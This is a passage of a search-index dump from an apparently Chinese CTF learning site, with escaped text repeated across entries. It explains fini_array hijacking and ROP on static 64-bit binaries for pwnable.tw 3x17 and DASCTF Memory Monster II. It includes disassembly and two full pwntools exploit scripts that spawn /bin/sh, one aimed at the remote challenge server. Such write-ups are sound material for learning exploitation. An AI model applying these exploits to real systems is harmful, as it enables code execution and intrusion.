\u8fd9\u91cc\u660e\u786e\u77e5\u9053\u4e86 fini_array \u91cc\u9762\u5b58\u50a8\u4e86\u4e24\u4e2a\u6307\u9488\uff0c\u8c03\u7528\u987a\u5e8f\u4e3a\uff1a\u5148 fini_array[1] \uff0c\u518d fini_array[0] \u3002\u90a3\u4e48 \u5982\u679c\u6211\u4eec\u628a fini_array[1] \u8986\u76d6\u4e3a\u51fd\u6570 A \u7684\u5730\u5740\uff0cfini_array[0] \u8986\u76d6\u4e3a __libc_csu_fini \u7684\u5730\u5740 \uff0c\u5f53\u9000\u51fa main \u540e\uff0c\u7a0b\u5e8f\u4f1a\u8fd9\u6837\uff1a __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini ...... \u8fd9\u4e2a\u5faa\u73af\u5c31\u4f1a\u4e00\u76f4\u6301\u7eed\u5230 fini_array[0] \u88ab\u8986\u76d6\u4e3a\u5176\u4ed6\u503c\u3002 \u8fd8\u6709\u4e2a\u70b9\u5c31\u662f\u4e0a\u9762\u63d0\u5230\u7684\u6e90\u7801\u4e2d\u7684 lea rbp, _fini_array_0 \uff0c\u5c06 rbp \u7684\u503c\u4fee\u6539\u4e3a fini_array[0] \u6240\u5728\u7684\u5730\u5740\uff0c\u90a3\u4e48\u914d\u5408 leave|ret \u5c31\u80fd\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10 \u7684\u5730\u5740\uff0c\u6211\u4eec\u5c31\u5c06\u5229\u7528\u51fd\u6570\u653e\u5728\u8fd9\u4e2a\u5730\u65b9\u3002","title":"__libc_csu_fini \u51fd\u6570"},{"location":"stackoverflow/hijack_fini_array_ROP/#pwnabletw-3x17","text":"","title":"pwnable.tw-3x17"},{"location":"stackoverflow/hijack_fini_array_ROP/#_2","text":"\u9759\u6001\u94fe\u63a5\u7684 64 \u4f4d\u7a0b\u5e8f\uff1a skye:~/CTF\u5b66\u4e60/fini_array\u52ab\u6301$ file 317 317: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped checksec \u68c0\u67e5\u662f\u6ca1\u6709 canary \u4f46\u662f\u6839\u636e\u6c47\u7f16\u53bb\u68c0\u67e5 \u662f\u6709 canary \u4fdd\u62a4 \u7684\uff1a Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"stackoverflow/hijack_fini_array_ROP/#_3","text":"\u9898\u76ee\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7528 lscan \u627e\u5230\u5bf9\u5e94 sig \u6587\u4ef6\u4fee\u590d\uff0c\u6216\u8005\u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\u4f4d\u7f6e\uff08shift+F12\uff09\u3002 main \u51fd\u6570\u4e2d\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u5165 0x18 \u7684\u529f\u80fd\uff1a //\u91cd\u547d\u540d\u90e8\u5206\u51fd\u6570\u540d int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax char *v4; // ST08_8 char buf; // [rsp+10h] [rbp-20h] unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); result = (unsigned __int8)++byte_4B9330; if ( byte_4B9330 == 1 ) { write_fun(1u, \"addr:\", 5uLL); read_fun(0, &buf, 0x18uLL);//\u8bfb\u53d6\u5730\u5740 v4 = (char *)(signed int)sub_40EE70((__int64)&buf); write_fun(1u, \"data:\", 5uLL); read_fun(0, v4, 0x18uLL);//\u5411\u8bfb\u53d6\u5730\u5740\u5199\u5165\u5185\u5bb9 result = 0; } if ( __readfsqword(0x28u) != v6 ) sub_44A3E0(); return result; }","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"stackoverflow/hijack_fini_array_ROP/#_4","text":"\u8fd9\u6761\u9898\u76ee\u8fd8\u6709\u5176\u4ed6\u89e3\u6cd5\uff0c\u56e0\u4e3a\u7528\u8fd9\u6761\u9898\u76ee\u5b66\u4e60 fini_array \u52ab\u6301 \u5c31\u8bb0\u5f55\u8fd9\u79cd\u505a\u6cd5\u3002\u5176\u4ed6\u89e3\u6cd5\uff1a pwnable.tw_3x17 \u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u53ea\u80fd\u7528\u5b83\u7684\u6709\u4e1c\u897f getshell \u3002\u5199 shellcode \u4f30\u8ba1\u8981 mprotect \u7ed9\u5185\u5bb9\u52a0\u4e0a\u8fd0\u884c\u6743\u9650\u7ed5\u8fc7 NX \u4fdd\u62a4\uff1b\u5199\u4e2a\u7cfb\u7edf\u8c03\u7528\u53f7\u53ef\u884c\u4e00\u70b9\u3002 \u90a3\u5c31\u9700\u8981\u7528\u5230\u5199\u5165\u529f\u80fd\u51fd\u6570\u4e86\uff0c\u5982\u679c\u9700\u8981\u7b26\u5408\u672c\u6587\u5b66\u4e60\u5185\u5bb9\uff0c\u5c31\u9700\u8981\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u51fd\u6570\uff0c\u521a\u597d main \u51fd\u6570\u5c31\u662f\u3002\u73b0\u5728\u660e\u786e\u601d\u8def\uff1a \u5c06 fini_array[1] \u8986\u76d6\u4e3a main \u51fd\u6570\u5730\u5740\uff1bfini_array[0] \u8986\u76d6\u4e3a __libc_start_fini \u5730\u5740\uff1b \u4f9d\u6b21\u5411 fini_array + 0x10 \u5199\u5165\u7cfb\u7edf\u8c03\u7528\u53f7\u5229\u7528\u4ee3\u7801\uff1b \u5199\u5165\u5b8c\u6210\u540e\uff0c\u5c06 fini_array[0] \u8986\u76d6\u4e3a leave|ret \uff0c\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10; \u6784\u5efa\u7684\u7cfb\u7edf\u8c03\u7528\u547d\u4ee4\uff1asyscall(0x3b,addr_of_binsh,0,0) \u76f8\u5f53\u4e8e\uff1aexecve(addr_of_binsh,0,0) \u7cfb\u7edf\u8c03\u7528\u53f7\u67e5\u8be2\uff1ahttps://www.mrskye.cn/archives/168/","title":"\u601d\u8def"},{"location":"stackoverflow/hijack_fini_array_ROP/#exp","text":"from pwn import * context.log_level = 'debug' #p = process(\"./317\") p = remote(\"chall.pwnable.tw\",10105) elf = process(\"./317\") fini_array = 0x4B40F0 main_addr = 0x401B6D libc_csu_fini = 0x402960 esp = fini_array + 0x10 leave_ret = 0x401C4B ret = 0x401016 rop_syscall = 0x471db5 rop_pop_rax = 0x41e4af rop_pop_rdx = 0x446e35 rop_pop_rsi = 0x406c30 rop_pop_rdi = 0x401696 bin_sh_addr = 0x4B419A def write(addr,data): p.recv() p.send(str(addr)) p.recv() p.send(data) def exp(): # hijack fini_array #gdb.attach(p) write(fini_array,p64(libc_csu_fini) + p64(main_addr)) # rop chain write(bin_sh_addr,\"/bin/sh\\x00\") write(esp,p64(rop_pop_rax)) write(esp+8,p64(0x3b)) write(esp+16,p64(rop_pop_rdi)) write(esp+24,p64(bin_sh_addr)) write(esp+32,p64(rop_pop_rdx)) write(esp+40,p64(0)) write(esp+48,p64(rop_pop_rsi)) write(esp+56,p64(0)) write(esp+64,p64(rop_syscall)) # stack pivoting write(fini_array,p64(leave_ret) + p64(ret)) if __name__ == '__main__': exp() p.interactive()","title":"exp"},{"location":"stackoverflow/hijack_fini_array_ROP/#_5","text":"[\u539f\u521b]pwnable.tw\u65b0\u624b\u5411write up(\u4e8c) 3\u00d717-x64\u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u7684fini_array\u52ab\u6301","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"stackoverflow/hijack_fini_array_ROP/#memory-monster-ii","text":"\u9898\u76ee\u6765\u6e90 DASCTF \u4e94\u6708\u8d5b\uff0c\u4f5c\u8005\u4e3a TaQini \uff0c \u9644\u4ef6 \u8fd9\u91cc\u548c\u4e0a\u9762\u90a3\u6761\u673a\u4f1a\u4e00\u6837\uff0c\u4e0b\u9762\u662f\u72ec\u7acb\u5b8c\u6210\uff0c\u8be6\u7ec6\u8bb0\u5f55\u4e00\u4e0b","title":"Memory Monster II"},{"location":"stackoverflow/hijack_fini_array_ROP/#_6","text":"checksec \u68c0\u67e5\u662f\u6ca1\u6709 canary \u4f46\u662f\u6839\u636e\u6c47\u7f16\u53bb\u68c0\u67e5 \u662f\u6709 canary \u4fdd\u62a4 \u7684\uff1a Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"stackoverflow/hijack_fini_array_ROP/#_7","text":"\u9898\u76ee\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7528 lscan \u627e\u5230\u5bf9\u5e94 sig \u6587\u4ef6\u4fee\u590d\uff0c\u6ca1\u6709\u5375\u7528\u53ea\u4fee\u590d\u4e86\u4e24\u4e2a\u51fd\u6570\uff0c\u4f46\u662f\u80fd\u770b\u5230 _start \u51fd\u6570\uff1a\uff08\u91cd\u547d\u540d\u90e8\u5206\u51fd\u6570\uff09 .text:0000000000401B00 public start .text:0000000000401B00 start proc near ; DATA XREF: LOAD:0000000000400018\u2191o .text:0000000000401B00 ; __unwind { .text:0000000000401B00 xor ebp, ebp .text:0000000000401B02 mov r9, rdx .text:0000000000401B05 pop rsi .text:0000000000401B06 mov rdx, rsp .text:0000000000401B09 and rsp, 0FFFFFFFFFFFFFFF0h .text:0000000000401B0D push rax .text:0000000000401B0E push rsp .text:0000000000401B0F mov r8, offset __libc_start_fini .text:0000000000401B16 mov rcx, offset __libc_start_init .text:0000000000401B1D mov rdi, offset main .text:0000000000401B24 db 67h .text:0000000000401B24 call sub_4020B0 .text:0000000000401B2A hlt .text:0000000000401B2A ; } // starts at 401B00 .text:0000000000401B2A start endp \u4f9d\u636e\u89c4\u5f8b\u77e5\u9053\u4e09\u4e2a mov \u4f9d\u6b21\u662f\u5904\u7406 __libc_start_fini\u3001__libc_start_init\u3001main \u3002\u4ece\u8fd9\u91cc\u83b7\u53d6\u5230\u5173\u952e\u53c2\u6570\uff1a __libc_start_fini\u3001main \u5730\u5740\u3002 \u7136\u540e gdb \u8c03\u8bd5\uff0c\u65ad\u70b9\u6253\u5728 __libc_start_fini \uff0c\u4e00\u76f4\u8fd0\u884c\u5230 call \u6307\u4ee4\uff0crbp \u5b58\u50a8\u7684\u503c\u5c31\u662f fini_array[0] \u7684\u5730\u5740 0x4b80b0 \uff1a leave_ret \u548c ret \u901a\u8fc7 ROPgadget \u76f4\u63a5\u80fd\u67e5\u5230\uff1brax\u3001rdi\u3001rsi\u3001rdx \u4f20\u53c2 gadget \u4e5f\u80fd\u627e\u5230\uff0c\u8fd9\u51e0\u4e2a gadget \u627e\u90a3\u79cd\u53ea\u7a7f\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\uff1a pop rax;ret \u3002","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"stackoverflow/hijack_fini_array_ROP/#exp_1","text":"from pwn import * context.log_level = 'debug' p = process(\"./main\") elf = ELF(\"./main\") #hijack fini libc_csu_fini = 0x0402CB0 main_addr = 0x0401C1D fini_array = 0x4b80b0 esp = fini_array + 0x10 leave_ret = 0x0401cf3 ret = 0x0401016 #execve('/bin/sh',0,0) rop_syscall = 0x46F745 rop_pop_rax = 0x0000000000448fcc rop_pop_rdx = 0x0000000000448415 rop_pop_rsi = 0x0000000000406f80 rop_pop_rdi = 0x0000000000401746 bin_sh_addr = 0x492895 def write(addr,data): p.sendlineafter('addr:',p64(addr)) p.sendafter('data:',data) # hijack fini_array gdb.attach(p,'b *0x0402CB0') write(fini_array,p64(libc_csu_fini) + p64(main_addr)) # rop chain write(esp,p64(rop_pop_rax)) write(esp+8,p64(0x3b)) write(esp+16,p64(rop_pop_rdi)) write(esp+24,p64(bin_sh_addr)) write(esp+32,p64(rop_pop_rdx)) write(esp+40,p64(0)) write(esp+48,p64(rop_pop_rsi)) write(esp+56,p64(0)) write(esp+64,p64(rop_syscall)) # stack pivoting #gdb.attach(p) write(fini_array,p64(leave_ret) + p64(ret)) p.interactive()","title":"exp"},{"location":"stackoverflow/hijack_fini_array_ROP/#_8","text":"\u8be6\u89e364\u4f4d\u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u7684fini_array\u52ab\u6301\u53caROP\u653b\u51fb","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/","text":"\u52ab\u6301 64 \u4f4d fini_array \u8fdb\u884c ROP \u653b\u51fb \u7a0b\u5e8f\u8d77\u70b9 \u7a0b\u5e8f\u7684\u542f\u52a8\u6d41\u7a0b\u5982\u56fe\u6240\u793a\uff1a \u53ef\u4ee5\u770b\u5230 main \u51fd\u6570\u4e0d\u662f\u7a0b\u5e8f\u8d77\u70b9\uff0c\u4e4b\u524d\u5199\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u4e5f\u5206\u6790\u8fc7 text \u6bb5\u8d77\u70b9\u662f _start \u51fd\u6570 \u3002_start \u51fd\u6570\u8c03\u7528__libc_start_main \u5b8c\u6210\u542f\u52a8\u548c\u9000\u51fa\u5de5\u4f5c\u3002\u5177\u4f53\u770b\u770b _start \u51fd\u6570\uff1a .text:0000000000401A60 public start .text:0000000000401A60 start proc near ; DATA XREF: LOAD:0000000000400018\u2191o .text:0000000000401A60 ; __unwind { .text:0000000000401A60 xor ebp, ebp .text:0000000000401A62 mov r9, rdx .text:0000000000401A65 pop rsi .text:0000000000401A66 mov rdx, rsp .text:0000000000401A69 and rsp, 0FFFFFFFFFFFFFFF0h .text:0000000000401A6D push rax .text:0000000000401A6E push rsp // \u4ee5\u6b64\u5c06 fini\u3001init\u3001main \u5730\u5740\u538b\u5165\u5bc4\u5b58\u5668 .text:0000000000401A6F mov r8, offset sub_402BD0 ; fini .text:0000000000401A76 mov rcx, offset loc_402B40 ; init .text:0000000000401A7D mov rdi, offset main .text:0000000000401A84 db 67h .text:0000000000401A84 call __libc_start_main .text:0000000000401A8A hlt .text:0000000000401A8A ; } // starts at 401A60 .text:0000000000401A8A start endp __libc_start_main \u5b9a\u4e49\u539f\u578b \uff1a int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (*stack_end)); \u6839\u636e 64 \u4f4d\u4f20\u53c2\u7279\u5b9a\u5f97\u51fa\u5bf9\u5e94\u5bc4\u5b58\u5668\u503c\u3002\u8fd9\u4e2a\u6267\u884c\u987a\u5e8f\u6211\u662f\u901a\u8fc7\u8c03\u8bd5\u5f97\u51fa\u6765\u7684\u3002\uff08__libc_csu_init \u7684\u8bdd\u662f ret2csu \u5229\u7528\u5bf9\u8c61\u3002\uff09 rdi <- main rcx <- __libc_csu_init //\u5728main\u51fd\u6570\u524d\u6267\u884c r8 <- __libc_csu_fini //\u5728main\u51fd\u6570\u540e\u6267\u884c __libc_csu_fini \u51fd\u6570 __libc_csu_fini \u51fd\u6570\u662f main \u51fd\u6570\u9000\u51fa\u8fd4\u56de\u5230 __libc_start_main \u540e\uff0c\u901a\u8fc7 __libc_start_main \u8c03\u7528\u7684\u3002\u5177\u4f53\u770b\u770b\u51fd\u6570\uff1a .text:0000000000402960 __libc_csu_fini proc near ; DATA XREF: start+F\u2191o .text:0000000000402960 ; __unwind { .text:0000000000402960 push rbp .text:0000000000402961 lea rax, unk_4B4100 .text:0000000000402968 lea rbp, _fini_array_0 .text:000000000040296F push rbx .text:0000000000402970 sub rax, rbp .text:0000000000402973 sub rsp, 8 .text:0000000000402977 sar rax, 3 .text:000000000040297B jz short loc_402996 .text:000000000040297D lea rbx, [rax-1] .text:0000000000402981 nop dword ptr [rax+00000000h] .text:0000000000402988 .text:0000000000402988 loc_402988: ; CODE XREF: __libc_csu_fini+34\u2193j .text:0000000000402988 call qword ptr [rbp+rbx*8+0] .text:000000000040298C sub rbx, 1 .text:0000000000402990 cmp rbx, 0FFFFFFFFFFFFFFFFh .text:0000000000402994 jnz short loc_402988 .text:0000000000402996 .text:0000000000402996 loc_402996: ; CODE XREF: __libc_csu_fini+1B\u2191j .text:0000000000402996 add rsp, 8 .text:000000000040299A pop rbx .text:000000000040299B pop rbp .text:000000000040299C jmp sub_48E32C .text:000000000040299C ; } // starts at 402960 .text:000000000040299C __libc_csu_fini endp \u6ce8\u610f\u4ee5\u4e0b\u8fd9\u4e09\u884c\u6e90\u7801\uff0c\u662f\u52ab\u6301 fini_array \u5b9e\u73b0\u65e0\u9650\u5199\u8fdb\u884c ROP \u7684\u5173\u952e\uff1a //\u5c06 fini_array[0] \u7684\u503c\u52a0\u8f7d\u5230 rbp .text:0000000000402968 lea rbp, _fini_array_0 //\u7ecf\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\u540e\uff0c\u8fd9\u91cc\u4f1a call fini_array[1] \uff0c\u4e5f\u5c31\u662f\u8c03\u7528\u5b58\u50a8\u5728 fini_array[1] \u7684\u6307\u9488 .text:0000000000402988 call qword ptr [rbp+rbx*8+0] //\u8c03\u7528\u5b8c fini_array[1] \u4e4b\u540e\u518d\u6b21\u8fdb\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\uff0c\u8fd9\u91cc\u4f1a call fini_array[0] .text:0000000000402988 call qword ptr [rbp+rbx*8+0] \u770b\u4e00\u4e0b fini_array \u7684\u4ee3\u7801\uff1a .fini_array:00000000004B40F0 _fini_array segment para public 'DATA' use64 .fini_array:00000000004B40F0 assume cs:_fini_array .fini_array:00000000004B40F0 ;org 4B40F0h .fini_array:00000000004B40F0 _fini_array_0 dq offset sub_401B00 ; DATA XREF: .text:000000000040291C\u2191o .fini_array:00000000004B40F0 ; __libc_csu_fini+8\u2191o .fini_array:00000000004B40F8 dq offset sub_401580 .fini_array:00000000004B40F8 _fini_array ends \u8fd9\u91cc\u660e\u786e\u77e5\u9053\u4e86 fini_array \u91cc\u9762\u5b58\u50a8\u4e86\u4e24\u4e2a\u6307\u9488\uff0c\u8c03\u7528\u987a\u5e8f\u4e3a\uff1a\u5148 fini_array[1] \uff0c\u518d fini_array[0] \u3002\u90a3\u4e48 \u5982\u679c\u6211\u4eec\u628a fini_array[1] \u8986\u76d6\u4e3a\u51fd\u6570 A \u7684\u5730\u5740\uff0cfini_array[0] \u8986\u76d6\u4e3a __libc_csu_fini \u7684\u5730\u5740 \uff0c\u5f53\u9000\u51fa main \u540e\uff0c\u7a0b\u5e8f\u4f1a\u8fd9\u6837\uff1a __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini ...... \u8fd9\u4e2a\u5faa\u73af\u5c31\u4f1a\u4e00\u76f4\u6301\u7eed\u5230 fini_array[0] \u88ab\u8986\u76d6\u4e3a\u5176\u4ed6\u503c\u3002 \u8fd8\u6709\u4e2a\u70b9\u5c31\u662f\u4e0a\u9762\u63d0\u5230\u7684\u6e90\u7801\u4e2d\u7684 lea rbp, _fini_array_0 \uff0c\u5c06 rbp \u7684\u503c\u4fee\u6539\u4e3a fini_array[0] \u6240\u5728\u7684\u5730\u5740\uff0c\u90a3\u4e48\u914d\u5408 leave|ret \u5c31\u80fd\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10 \u7684\u5730\u5740\uff0c\u6211\u4eec\u5c31\u5c06\u5229\u7528\u51fd\u6570\u653e\u5728\u8fd9\u4e2a\u5730\u65b9\u3002 pwnable.tw-3x17 \u4fdd\u62a4\u60c5\u51b5 \u9759\u6001\u94fe\u63a5\u7684 64 \u4f4d\u7a0b\u5e8f\uff1a skye:~/CTF\u5b66\u4e60/fini_array\u52ab\u6301$ file 317 317: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped checksec \u68c0\u67e5\u662f\u6ca1\u6709 canary \u4f46\u662f\u6839\u636e\u6c47\u7f16\u53bb\u68c0\u67e5 \u662f\u6709 canary \u4fdd\u62a4 \u7684\uff1a Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \u6f0f\u6d1e\u51fd\u6570 \u9898\u76ee\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7528 lscan \u627e\u5230\u5bf9\u5e94 sig \u6587\u4ef6\u4fee\u590d\uff0c\u6216\u8005\u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\u4f4d\u7f6e\uff08shift+F12\uff09\u3002 main \u51fd\u6570\u4e2d\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u5165 0x18 \u7684\u529f\u80fd\uff1a //\u91cd\u547d\u540d\u90e8\u5206\u51fd\u6570\u540d int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax char *v4; // ST08_8 char buf; // [rsp+10h] [rbp-20h] unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); result = (unsigned __int8)++byte_4B9330; if ( byte_4B9330 == 1 ) { write_fun(1u, \"addr:\", 5uLL); read_fun(0, &buf, 0x18uLL);//\u8bfb\u53d6\u5730\u5740 v4 = (char *)(signed int)sub_40EE70((__int64)&buf); write_fun(1u, \"data:\", 5uLL); read_fun(0, v4, 0x18uLL);//\u5411\u8bfb\u53d6\u5730\u5740\u5199\u5165\u5185\u5bb9 result = 0; } if ( __readfsqword(0x28u) != v6 ) sub_44A3E0(); return result; } \u601d\u8def \u8fd9\u6761\u9898\u76ee\u8fd8\u6709\u5176\u4ed6\u89e3\u6cd5\uff0c\u56e0\u4e3a\u7528\u8fd9\u6761\u9898\u76ee\u5b66\u4e60 fini_array \u52ab\u6301 \u5c31\u8bb0\u5f55\u8fd9\u79cd\u505a\u6cd5\u3002\u5176\u4ed6\u89e3\u6cd5\uff1a pwnable.tw_3x17 \u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u53ea\u80fd\u7528\u5b83\u7684\u6709\u4e1c\u897f getshell \u3002\u5199 shellcode \u4f30\u8ba1\u8981 mprotect \u7ed9\u5185\u5bb9\u52a0\u4e0a\u8fd0\u884c\u6743\u9650\u7ed5\u8fc7 NX \u4fdd\u62a4\uff1b\u5199\u4e2a\u7cfb\u7edf\u8c03\u7528\u53f7\u53ef\u884c\u4e00\u70b9\u3002 \u90a3\u5c31\u9700\u8981\u7528\u5230\u5199\u5165\u529f\u80fd\u51fd\u6570\u4e86\uff0c\u5982\u679c\u9700\u8981\u7b26\u5408\u672c\u6587\u5b66\u4e60\u5185\u5bb9\uff0c\u5c31\u9700\u8981\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u51fd\u6570\uff0c\u521a\u597d main \u51fd\u6570\u5c31\u662f\u3002\u73b0\u5728\u660e\u786e\u601d\u8def\uff1a \u5c06 fini_array[1] \u8986\u76d6\u4e3a main \u51fd\u6570\u5730\u5740\uff1bfini_array[0] \u8986\u76d6\u4e3a __libc_start_fini \u5730\u5740\uff1b \u4f9d\u6b21\u5411 fini_array + 0x10 \u5199\u5165\u7cfb\u7edf\u8c03\u7528\u53f7\u5229\u7528\u4ee3\u7801\uff1b \u5199\u5165\u5b8c\u6210\u540e\uff0c\u5c06 fini_array[0] \u8986\u76d6\u4e3a leave|ret \uff0c\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10; \u6784\u5efa\u7684\u7cfb\u7edf\u8c03\u7528\u547d\u4ee4\uff1asyscall(0x3b,addr_of_binsh,0,0) \u76f8\u5f53\u4e8e\uff1aexecve(addr_of_binsh,0,0) \u7cfb\u7edf\u8c03\u7528\u53f7\u67e5\u8be2\uff1ahttps://www.mrskye.cn/archives/168/ exp from pwn import * context.log_level = 'debug' #p = process(\"./317\") p = remote(\"chall.pwnable.tw\",10105) elf = process(\"./317\") fini_array = 0x4B40F0 main_addr = 0x401B6D libc_csu_fini = 0x402960 esp = fini_array + 0x10 leave_ret = 0x401C4B ret = 0x401016 rop_syscall = 0x471db5 rop_pop_rax = 0x41e4af rop_pop_rdx = 0x446e35 rop_pop_rsi = 0x406c30 rop_pop_rdi = 0x401696 bin_sh_addr = 0x4B419A def write(addr,data): p.recv() p.send(str(addr)) p.recv() p.send(data) def exp(): # hijack fini_array #gdb.attach(p) write(fini_array,p64(libc_csu_fini) + p64(main_addr)) # rop chain write(bin_sh_addr,\"/bin/sh\\x00\") write(esp,p64(rop_pop_rax)) write(esp+8,p64(0x3b)) write(esp+16,p64(rop_pop_rdi)) write(esp+24,p64(bin_sh_addr)) write(esp+32,p64(rop_pop_rdx)) write(esp+40,p64(0)) write(esp+48,p64(rop_pop_rsi)) write(esp+56,p64(0)) write(esp+64,p64(rop_syscall)) # stack pivoting write(fini_array,p64(leave_ret) + p64(ret)) if __name__ == '__main__': exp() p.interactive() \u53c2\u8003\u6587\u7ae0 [\u539f\u521b]pwnable.tw\u65b0\u624b\u5411write up(\u4e8c) 3\u00d717-x64\u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u7684fini_array\u52ab\u6301 Memory Monster II \u9898\u76ee\u6765\u6e90 DASCTF \u4e94\u6708\u8d5b\uff0c\u4f5c\u8005\u4e3a TaQini \uff0c \u9644\u4ef6 \u8fd9\u91cc\u548c\u4e0a\u9762\u90a3\u6761\u673a\u4f1a\u4e00\u6837\uff0c\u4e0b\u9762\u662f\u72ec\u7acb\u5b8c\u6210\uff0c\u8be6\u7ec6\u8bb0\u5f55\u4e00\u4e0b \u4fdd\u62a4\u60c5\u51b5 checksec \u68c0\u67e5\u662f\u6ca1\u6709 canary \u4f46\u662f\u6839\u636e\u6c47\u7f16\u53bb\u68c0\u67e5 \u662f\u6709 canary \u4fdd\u62a4 \u7684\uff1a Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \u6f0f\u6d1e\u51fd\u6570 \u9898\u76ee\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7528 lscan \u627e\u5230\u5bf9\u5e94 sig \u6587\u4ef6\u4fee\u590d\uff0c\u6ca1\u6709\u5375\u7528\u53ea\u4fee\u590d\u4e86\u4e24\u4e2a\u51fd\u6570\uff0c\u4f46\u662f\u80fd\u770b\u5230 _start \u51fd\u6570\uff1a\uff08\u91cd\u547d\u540d\u90e8\u5206\u51fd\u6570\uff09 .text:0000000000401B00 public start .text:0000000000401B00 start proc near ; DATA XREF: LOAD:0000000000400018\u2191o .text:0000000000401B00 ; __unwind { .text:0000000000401B00 xor ebp, ebp .text:0000000000401B02 mov r9, rdx .text:0000000000401B05 pop rsi .text:0000000000401B06 mov rdx, rsp .text:0000000000401B09 and rsp, 0FFFFFFFFFFFFFFF0h .text:0000000000401B0D push rax .text:0000000000401B0E push rsp .text:0000000000401B0F mov r8, offset __libc_start_fini .text:0000000000401B16 mov rcx, offset __libc_start_init .text:0000000000401B1D mov rdi, offset main .text:0000000000401B24 db 67h .text:0000000000401B24 call sub_4020B0 .text:0000000000401B2A hlt .text:0000000000401B2A ; } // starts at 401B00 .text:0000000000401B2A start endp \u4f9d\u636e\u89c4\u5f8b\u77e5\u9053\u4e09\u4e2a mov \u4f9d\u6b21\u662f\u5904\u7406 __libc_start_fini\u3001__libc_start_init\u3001main \u3002\u4ece\u8fd9\u91cc\u83b7\u53d6\u5230\u5173\u952e\u53c2\u6570\uff1a __libc_start_fini\u3001main \u5730\u5740\u3002 \u7136\u540e gdb \u8c03\u8bd5\uff0c\u65ad\u70b9\u6253\u5728 __libc_start_fini \uff0c\u4e00\u76f4\u8fd0\u884c\u5230 call \u6307\u4ee4\uff0crbp \u5b58\u50a8\u7684\u503c\u5c31\u662f fini_array[0] \u7684\u5730\u5740 0x4b80b0 \uff1a leave_ret \u548c ret \u901a\u8fc7 ROPgadget \u76f4\u63a5\u80fd\u67e5\u5230\uff1brax\u3001rdi\u3001rsi\u3001rdx \u4f20\u53c2 gadget \u4e5f\u80fd\u627e\u5230\uff0c\u8fd9\u51e0\u4e2a gadget 